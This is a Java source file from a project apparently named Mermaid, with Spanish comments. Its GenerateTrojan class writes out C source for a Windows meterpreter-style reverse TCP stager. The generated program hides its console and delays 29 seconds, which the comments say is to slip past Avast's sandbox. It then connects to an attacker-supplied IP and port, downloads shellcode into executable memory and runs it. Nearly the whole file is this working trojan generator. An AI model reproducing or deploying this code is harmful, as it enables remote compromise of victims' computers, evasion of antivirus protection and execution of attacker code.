package net.jlxip.mermaid;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;

public class GenerateTrojan {
    public static void generate(File trojan, String IP, String PORT){     // FUNCI�N PARA GENERAR EL EXPLOIT
        try{
        	FileWriter FWwriter = new FileWriter(trojan);
            PrintWriter writer = new PrintWriter(FWwriter);	// Abrimos el archivo recibido por argumentos para escribir en �l
            // ESCRIBIMOS EL EXPLOIT
            // CORTES�A DE VEIL-EVASION ( https://goo.gl/BF0evF )
            // ME TIR� UN PUTO D�A DE-OFUSCANDO EL C�DIGO DE SU PAYLOAD "c/meterpreter/reverse_tcp"
            writer.println("#define _WIN32_WINNT 0x0500");  // Establecemos _WIN32_WINNT a 0X0500 para poder ocultar la ventana
            writer.println("#include <winsock2.h>");    // Inclu�mos la librer�a "winsock2.h"
            writer.println("#include <stdio.h>");       // Inclu�mos la librer�a "stdio.h"
            writer.println("#include <string.h>");      // Inclu�mos la librer�a "string.h"
            writer.println("#include <stdlib.h>");      // Inclu�mos la librer�a "stdlib.h"
            writer.println("#include <time.h>");        // Inclu�mos la librer�a "time.h"
            writer.println("#include <windows.h>");     // Inclu�mos la librer�a "windows.h"
            writer.println("void CloseSocketError(SOCKET recvSocket) {");   // Funci�n para cerrar el programa si falla algo (�Borra las pruebas, Jhonny!)
            writer.println("	closesocket(recvSocket);");   // Cerramos el socket recibido por argumentos
            writer.println("	WSACleanup();");      // Limpiamos el WSA
            writer.println("	exit(1);");       // Salimos marcando que ha habido un error
            writer.println("}");
            writer.println("main() {");     // Funci�n Main
            writer.println("	ShowWindow( GetConsoleWindow(), SW_HIDE );");     // Ocultamos la ventana
            writer.println("	int retTime = time(0) + 29;");    // Esperamos 29 segundos (antes eran 30, pero se convirti� en un patr�n detectado) para evitarnos el DeepScreen de AVAST y similares...
            writer.println("	while(time(0)<retTime);");        // Mientras no haya acabado el tiempo, no hace nada.
            
            writer.println("      char* IP = \""+IP+"\";");   // Creamos una cadena de car�cteres con la IP/DNS elegida en el perfil
            writer.println("      int PORT = "+PORT+";");     // Creamos una variable entera con el puerto
            
            writer.println("	ULONG32 length;");    // Creamos una variable ULONG32 con la longitud
            writer.println("	char * shellcode;");  // Creamos una cadena de car�cteres para almacenar posteriormente el shellcode
            writer.println("	WORD wVersionRequested = MAKEWORD(2, 2);");   // Creamos una variable WORD con la versi�n de SOCKET necesaria
            writer.println("	WSADATA wsaData;");   // Creamos un nuevo WSADATA
            writer.println("	if (WSAStartup(wVersionRequested, &wsaData) < 0) {"); // Si la versi�n no es la requerida...
            writer.println("		WSACleanup();");  // Limpiamos el WSA
            writer.println("		exit(1);");       // Cerramos marcando que ha ocurrido un error
            writer.println("	}");
            writer.println("	struct hostent * ConnectionSocket_HOST;");    // Creamos una variable con el HOST remoto
            writer.println("	struct sockaddr_in ConnectionSocket_PORT;");  // Creamos una variable con el puerto remoto
            writer.println("	SOCKET ConnectionSocket;");   // Creamos un nuevo socket
            writer.println("	ConnectionSocket = socket(AF_INET, SOCK_STREAM, 0);");    // Lo inicializamos
            writer.println("	if (ConnectionSocket == INVALID_SOCKET){");   // Si es inv�lido...
            writer.println("		CloseSocketError(ConnectionSocket);");    // Recurrimos a CloseSocketError
            writer.println("	}");
            writer.println("	ConnectionSocket_HOST = gethostbyname(IP);"); // Obtenemos el HOST mediante el nombre de dominio
            writer.println("	if (ConnectionSocket_HOST == NULL){");    // Si no se puede resolver IP/DNS
            writer.println("		CloseSocketError(ConnectionSocket);");    // Recurrimos de nuevo a CloseSocketError
            writer.println("	}");
            writer.println("	memcpy(&ConnectionSocket_PORT.sin_addr.s_addr, ConnectionSocket_HOST->h_addr, ConnectionSocket_HOST->h_length);");    // Establecemos el HOST en el socket (creo, en realidad no tengo ni idea de qu� ocurre). Perd�n de nuevo :S
            writer.println("	ConnectionSocket_PORT.sin_family = AF_INET;");    // Ponemos el tipo de conexi�n
            writer.println("	ConnectionSocket_PORT.sin_port = htons(PORT);");  // Establecemos el puerto
            writer.println("	if ( connect(ConnectionSocket, (struct sockaddr *)&ConnectionSocket_PORT, sizeof(ConnectionSocket_PORT)) ){");    // Si ocurre alg�n error...
            writer.println("		CloseSocketError(ConnectionSocket);");    // Recurrimos a CloseSocketError
            writer.println("	}");
            writer.println("	int received = recv(ConnectionSocket, (char *)&length, 4, 0);");  // Recibimos una "confirmaci�n"
            writer.println("	if (received != 4 || length <= 0){"); // Si lo recibido es distinto a 4 o menor que 0...
            writer.println("		CloseSocketError(ConnectionSocket);");    // Recurrimos a CloseSocketError
            writer.println("	}");
            writer.println("	shellcode = VirtualAlloc(0, length+5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);"); // Preparamos la variable para almacenar el shellcode
            writer.println("	if (shellcode == NULL){");    // Si despu�s de lo de arriba, se encuentra nula...
            writer.println("		CloseSocketError(ConnectionSocket);");    // Recurrimos a CloseSocketError
            writer.println("	}");
            writer.println("	shellcode[0] = 0xBF;");   // Escribimos el primer byte de la shellcode
            writer.println("	memcpy(shellcode + 1, &ConnectionSocket, 4);");   // Copiamos la shellcode
            writer.println("	int lastByte=0;");    // Creamos una variable entera con el �ltimo byte le�do
            writer.println("	int currentByte=0;"); // Creamos una variable entera con el byte actual
            writer.println("	void * startb = shellcode + 5;"); // Guardamos el byte inicial de la shellcode
            writer.println("	while (currentByte < length) {"); // Mientras el byte actual sea menor al tama�o... (recorremos)
            writer.println("		lastByte = recv(ConnectionSocket, (char *)startb, length - currentByte, 0);");    // Establecemos el �ltimo byte a uno recibido
            writer.println("		startb += lastByte;");    // Sumamos el �ltimo byte al byte inicial
            writer.println("		currentByte += lastByte;");   // Sumamos el �ltimo byte al byte actual
            writer.println("		if (lastByte == SOCKET_ERROR) {");    // Si el �ltimo byte contiene un error de socket
            writer.println("			CloseSocketError(ConnectionSocket);");    // Recurrimos a CloseSocketError
            writer.println("		}");
            writer.println("	}");
            writer.println("	void (*LaunchShellcode)() = (void(*)())shellcode;");  // Preparamos el m�todo para lanzar la shellcode
            writer.println("	LaunchShellcode();"); // Y por �ltimo... �Lanzamos la shellcode!
            writer.println("	return 0;");  // Cuando finalize la shellcode (probablemente por un cierre en el cliente) cerramos el exploit
            writer.println("}");
            writer.close(); // Cerramos el archivo
            FWwriter.close();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }
}
